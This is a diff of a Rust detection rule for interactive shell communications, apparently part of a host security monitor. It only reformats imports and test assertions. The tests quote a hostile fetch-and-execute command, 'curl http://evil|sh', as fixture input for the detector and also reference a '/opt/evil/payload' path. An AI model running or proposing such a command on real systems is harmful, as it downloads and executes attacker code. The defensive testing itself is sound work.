@@ -34,7 +34,7 @@ use nn_model::{Event, ResponseAction, Severity, Verdict};
 use crate::config::comm_allowlist::CommAllowlist;
 use crate::config::comm_allowlist::Judgement;
 use crate::decision::attack::{AttackRef, Tactic};
-use crate::decision::{rules::build_verdict, Rule};
+use crate::decision::{Rule, rules::build_verdict};
 use crate::posture::host::PostureHost;
 
 /// Interactive shell comms (design §7.1).
@@ -282,9 +282,10 @@ mod tests {
         );
         let v = rule().evaluate(&ev).expect("fires");
         assert_eq!(v.severity, Severity::High); // base preserved
-        assert!(v
-            .reasoning
-            .contains("inline command (-c): curl http://evil|sh"));
+        assert!(
+            v.reasoning
+                .contains("inline command (-c): curl http://evil|sh")
+        );
         assert!(v.reasoning.contains("spawned by sshd"));
         assert!(!v.reasoning.contains("truncated"), "{}", v.reasoning);
     }
@@ -333,9 +334,11 @@ mod tests {
         assert!(rule().evaluate(&spawn("bash", "/bin/bash")).is_none());
         assert!(rule().evaluate(&spawn("sh", "/usr/bin/sh")).is_none());
         // A non-shell binary from a non-standard path is not R017's job.
-        assert!(rule()
-            .evaluate(&spawn("payload", "/opt/evil/payload"))
-            .is_none());
+        assert!(
+            rule()
+                .evaluate(&spawn("payload", "/opt/evil/payload"))
+                .is_none()
+        );
     }
 
     #[test]
